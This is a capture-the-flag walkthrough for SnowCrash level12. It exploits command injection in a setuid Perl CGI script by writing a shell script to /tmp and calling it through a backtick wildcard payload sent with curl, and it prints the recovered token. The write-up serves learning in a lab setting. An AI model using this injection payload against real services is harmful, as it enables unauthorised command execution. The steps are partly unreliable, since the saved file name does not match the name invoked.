@@ -1,0 +1,77 @@
+We "ls -l" in our home directory.
+
+level12@SnowCrash:~$ ls -l
+total 4
+-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
+
+Again we have a .pl file, we Cat it to see what it contains.
+
+level12@SnowCrash:~$ cat level12.pl
+#!/usr/bin/env perl
+# localhost:4646
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+
+sub t {
+  $nn = $_[1];
+  $xx = $_[0];
+  $xx =~ tr/a-z/A-Z/;
+  $xx =~ s/\s.*//;
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+  foreach $line (@output) {
+      ($f, $s) = split(/:/, $line);
+      if($s =~ $nn) {
+          return 1;
+      }
+  }
+  return 0;
+}
+
+sub n {
+  if($_[0] == 1) {
+      print("..");
+  } else {
+      print(".");
+  }
+}
+
+n(t(param("x"), param("y")));
+
+Lets analyze the code:
+
+> it asks for 2 parameters x stocked in $_[0], y stocked in $_[1].
+
+> we see that only the 1st argument is used, so we should only focus on $xx.
+
+>The function t 1st check if the argument is ToUpper ($xx =~ tr/a-z/A-Z/;).
+
+> Then it checks if the argument matches the Regex /(Something).
+
+> eGrep lines that start with $xx and stores it into output.
+
+With these infos we see that our Exploit should be in Uppercase and and written just like the regex.
+
+So it should look something like this.
+
+level12@SnowCrash:~$ vi /tmp/EXPLOIT.SH
+
+#!/bin/bash
+
+/bin/getflag > /tmp/here
+
+level12@SnowCrash:~$ chmod 777 /tmp/EXPLOIT.SH
+
+Now all we have to do is execute this script using the URL, but we need a way to skip the "tmp" since its not in Uppercase.
+
+And I found that we can use Wildcards to do so. (https://docs.vdms.com/cdn/Content/HRE/M/URL-Path-Wildcard.htm)
+
+So using Curl:
+
+level12@SnowCrash:~$ curl '127.0.0.1:4646/level12.pl?x="`/*/SCRIPT`"'
+..
+
+We cat:
+
+level12@SnowCrash:~$ cat /tmp/here
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
